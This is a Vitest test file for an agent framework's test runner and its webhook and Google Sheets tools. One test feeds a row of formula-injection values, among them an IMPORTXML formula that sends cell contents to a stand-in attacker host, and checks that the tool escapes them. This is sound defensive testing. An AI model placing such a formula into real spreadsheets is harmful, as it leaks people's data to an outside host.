import { describe, expect, it } from 'vitest'
import { builtin, defineAgent, runAgent } from './index'
import { mockModel, testRun } from './testing'

describe('testRun', () => {
  it('puts earlier messages before the current one', async () => {
    const agent = defineAgent({})
    const { input } = testRun(agent, '19:00', {
      model: mockModel([{ text: 'Booked.' }]),
      history: [
        { role: 'user', content: 'Table for 2 on Friday?' },
        { role: 'assistant', content: 'Which time?' },
      ],
      customerName: 'Sam',
    })
    expect(input.history.map((m) => m.content)).toEqual([
      'Table for 2 on Friday?',
      'Which time?',
      '19:00',
    ])
    expect(input.customer.name).toBe('Sam')
    await expect(runAgent(input)).resolves.toMatchObject({ reply: 'Booked.' })
  })
})

describe('webhook and sheet tools', () => {
  it('post what the customer shared, with who it came from', async () => {
    const agent = defineAgent({
      tools: {
        toCrm: builtin.webhook({ url: 'https://crm.example.com/hooks/lead' }),
        toSheet: builtin.saveToSheet({ url: 'https://script.google.com/macros/s/abc/exec' }),
      },
    })
    const model = mockModel([
      {
        toolCalls: [
          { name: 'toCrm', args: { summary: 'Catering for 40', details: { name: 'Sam', date: 'June 3' } } },
          { name: 'toSheet', args: { row: { name: 'Sam', request: 'catering for 40' } } },
        ],
      },
      { text: "Thanks Sam, I've passed that to the team." },
    ])
    const { input, record } = testRun(agent, 'Can you cater for 40 on June 3?', { model, customerName: 'Sam' })
    const result = await runAgent(input)
    expect(result.reply).toContain('passed that to the team')
    expect(record.posted).toHaveLength(2)
    expect(record.posted[0]).toMatchObject({
      url: 'https://crm.example.com/hooks/lead',
      payload: { summary: 'Catering for 40', details: { name: 'Sam', date: 'June 3' }, customer: { phone: '+15550001111', name: 'Sam' } },
    })
    expect(record.posted[1]!.payload).toMatchObject({ row: { name: 'Sam', request: 'catering for 40', whatsapp: "'+15550001111" } })
  })

  it('stops sheet cells from running as formulas and sends the shared secret', async () => {
    const agent = defineAgent({
      tools: { toSheet: builtin.saveToSheet({ url: 'https://script.google.com/macros/s/abc/exec', secret: 's3cret' }) },
    })
    const row = {
      name: '=IMPORTXML("https://evil.example/?"&A1, "//a")',
      phone: '+1 555 0100',
      note: '-2+3',
      tag: '@here',
      tab: '\t=1',
      cr: '\r=1',
      '=HYPERLINK("x")': 'header',
      plain: 'Sam = happy',
    }
    const model = mockModel([{ toolCalls: [{ name: 'toSheet', args: { row } }] }, { text: 'Saved.' }])
    const { input, record } = testRun(agent, 'hi', { model })
    await runAgent(input)
    const payload = record.posted[0]!.payload as { secret: string; row: Record<string, string> }
    expect(payload.secret).toBe('s3cret')
    expect(payload.row).toMatchObject({
      name: `'${row.name}`,
      phone: "'+1 555 0100",
      note: "'-2+3",
      tag: "'@here",
      tab: "'\t=1",
      cr: "'\r=1",
      '\'=HYPERLINK("x")': 'header',
      plain: 'Sam = happy',
    })
  })

  it('reports a failing webhook to the model instead of crashing', async () => {
    const agent = defineAgent({ tools: { toCrm: builtin.webhook({ url: 'https://crm.example.com/x' }) } })
    const model = mockModel([{ toolCalls: [{ name: 'toCrm', args: { summary: 'Lead' } }] }, { text: 'Sorry, I could not save that.' }])
    const { input, services } = testRun(agent, 'hi', { model })
    services.webhooks.post = async () => {
      throw new Error('The webhook answered HTTP 500')
    }
    const result = await runAgent(input)
    expect(result.toolCalls[0]).toMatchObject({ tool: 'toCrm', error: 'The webhook answered HTTP 500' })
  })

  it('refuses a URL that is not http(s)', () => {
    expect(() => builtin.webhook({ url: 'ftp://example.com' })).toThrow('http(s)')
    expect(() => builtin.saveToSheet({ url: 'not a url' })).toThrow('valid URL')
  })
})
